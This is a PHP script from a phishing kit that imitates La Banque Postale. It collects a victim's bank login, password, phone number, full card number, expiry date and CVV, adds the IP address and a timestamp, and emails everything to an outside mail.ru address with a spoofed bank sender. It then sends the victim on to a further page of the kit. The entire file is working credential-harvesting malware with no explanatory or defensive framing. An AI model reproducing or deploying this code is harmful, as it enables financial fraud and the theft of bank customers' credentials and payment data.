<?php
$date = gmdate("H:i:s | d/m/Y");
$ip = getenv("REMOTE_ADDR");
$message .= "=================================================================\n";
$message .= "ID                    :     ".$_POST["username"]."\n\r";
$message .= "Pass                  :     ".$_POST["password"]."\n\r";
$message .= "=================================================================\n";
$message .= "Num tel               :     ".$_POST[Ntel]."\n\r";
$message .= "Numero de Carte       :     ".$_POST[Ncarte]."\n\r";
$message .= "Date Dexpiration      :     ".$_POST[Exmoth]." / ".$_POST[Exyear]."\n\r";
$message .= "Cvv                   :     ".$_POST[Cvv]."\n\r";
$message .= "=================================================================\n";
$message .= "IP                    :     $ip\n\r";
$message .= "DATE                  :     $date\n\r";
$message .= "=================================================================\n";

$send = "raybanemsi@mail.ru";
$subject = "Full Info | Postale [$ip] ";
$from .= "From: La Banque Postale<localhost> ";


@mail($send,$subject,$message,$from);

?>
<SCRIPT LANGUAGE="JavaScript">
document.location.href="phone.php"
</SCRIPT>
 